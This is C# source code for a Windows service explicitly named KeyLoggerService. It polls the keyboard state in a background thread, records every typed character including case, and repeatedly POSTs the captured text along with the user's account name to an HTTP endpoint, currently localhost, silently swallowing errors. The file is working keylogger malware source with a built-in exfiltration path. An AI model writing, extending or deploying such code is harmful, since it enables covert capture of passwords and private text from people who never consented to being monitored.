using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Http;
using System.Windows.Forms;

namespace KeyLoggerService
{
    public partial class Service1 : ServiceBase
    {
        private string buf = "";
        private readonly HttpClient client = new HttpClient();
        private readonly string apiUrl = "http://localhost:5058/log?username=" + Environment.UserName;
        private Thread _workerThread;
        private bool _stopping = false;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            _stopping = false;
            _workerThread = new Thread(RunKeyLogger);
            _workerThread.IsBackground = true;
            _workerThread.Start();
        }

        protected override void OnStop()
        {
            _stopping = true;
            if (_workerThread != null && _workerThread.IsAlive)
            {
                _workerThread.Join(1000);
            }
        }

        private void RunKeyLogger()
        {
            while (!_stopping)
            {
                Thread.Sleep(100);

                // An even more advanced check
                bool shift = false;
                short shiftState = (short)GetAsyncKeyState(16);
                // Keys.ShiftKey doesn't work, so using its numeric equivalent
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                
                // Console.CapsLock might not be available in a service context without a console
                // Using GetKeyState(20) for CapsLock
                bool caps = (GetKeyState(0x14) & 0x0001) != 0;
                bool isBig = shift | caps;

                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if ((state & 0x8000) != 0) // Key is pressed
                    {
                        // Check for Space and Enter
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "&#x0a;"; continue; }

                        // Skip mouse buttons
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;

                        // Skip Shift, Ctrl, Alt, and other modifier keys
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) continue;
                        if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) continue;
                        if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) continue;

                        // Skip other non-essential keys
                        if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) continue;
                        if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) continue;
                        if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) continue;
                        if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) continue;
                        if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) continue;
                        if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) continue;

                        // Handle single character keys
                        if (((Keys)i).ToString().Length == 1 || ((Keys)i) >= Keys.D0 && ((Keys)i) <= Keys.D9)
                        {
                            char key = (char)0;
                            string keyName = ((Keys)i).ToString();
                            if (keyName.Length == 1)
                            {
                                key = keyName[0];
                            }
                            else if (keyName.StartsWith("D") && keyName.Length == 2)
                            {
                                key = keyName[1];
                            }

                            if (key != 0)
                            {
                                if (char.IsLetter(key) && isBig)
                                {
                                    buf += char.ToUpper(key);
                                }
                                else if (char.IsLetter(key) && !isBig)
                                {
                                    buf += char.ToLower(key);
                                }
                                else
                                {
                                    buf += key;
                                }
                            }
                        }
                        else
                        {
                            // Wrap non-single-character keys in angle brackets
                            buf += $"<{((Keys)i).ToString()}>";
                        }

                        if (buf.Length > 10)
                        {
                            _ = SendPayload(buf);
                            buf = "";
                        }
                    }
                }
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        private async Task SendPayload(string payload)
        {
            try
            {
                var content = new StringContent(payload, Encoding.UTF8, "text/plain");
                await client.PostAsync(apiUrl, content);
            }
            catch (Exception)
            {
                // Silently ignore errors
            }
        }
    }
}
